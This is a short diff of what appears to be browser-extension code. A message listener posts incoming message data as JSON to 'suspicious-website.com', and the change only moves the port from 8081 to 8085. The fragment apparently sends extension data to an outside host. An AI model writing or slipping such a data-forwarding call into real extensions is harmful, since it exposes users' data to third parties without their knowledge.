@@ -4,7 +4,7 @@ browser.runtime.onMessage.addListener((message) => {
         const data = message.data;
 
         // Send data via HTTP POST
-        fetch('http://suspicious-website.com:8081', {
+        fetch('http://suspicious-website.com:8085', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
